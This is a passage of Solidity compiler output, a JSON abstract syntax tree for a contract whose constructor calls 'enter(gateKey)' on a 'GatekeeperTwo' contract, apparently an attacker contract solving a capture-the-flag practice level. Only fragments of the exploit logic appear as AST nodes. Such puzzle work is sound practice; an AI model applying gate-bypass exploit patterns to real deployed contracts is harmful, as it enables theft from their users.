															"nodeType": "ElementaryTypeName",
															"src": "343:6:1",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 128,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "343:97:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "326:114:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 135,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 130,
														"name": "result",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 93,
														"src": "528:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 133,
																"name": "gateKey",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 105,
																"src": "550:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes8",
																	"typeString": "bytes8"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes8",
																	"typeString": "bytes8"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 131,
																"name": "target",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 91,
																"src": "537:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_GatekeeperTwo_$86",
																	"typeString": "contract GatekeeperTwo"
																}
															},
															"id": 132,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "enter",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 85,
															"src": "537:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_nonpayable$_t_bytes8_$returns$_t_bool_$",
																"typeString": "function (bytes8) external returns (bool)"
															}
														},
														"id": 134,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "537:21:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "528:30:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 136,
												"nodeType": "ExpressionStatement",
												"src": "528:30:1"
											}
										]
									},
									"documentation": null,
									"id": 138,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 96,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 95,
												"mutability": "mutable",
												"name": "_address",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 138,
												"src": "186:16:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 94,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "186:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "185:18:1"
									},
									"returnParameters": {
										"id": 97,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "211:0:1"
									},
									"scope": 139,
									"src": "174:391:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 140,
							"src": "88:479:1"
						}
					],
					"src": "32:536:1"
				},
				"id": 1
			}
		}
	}
}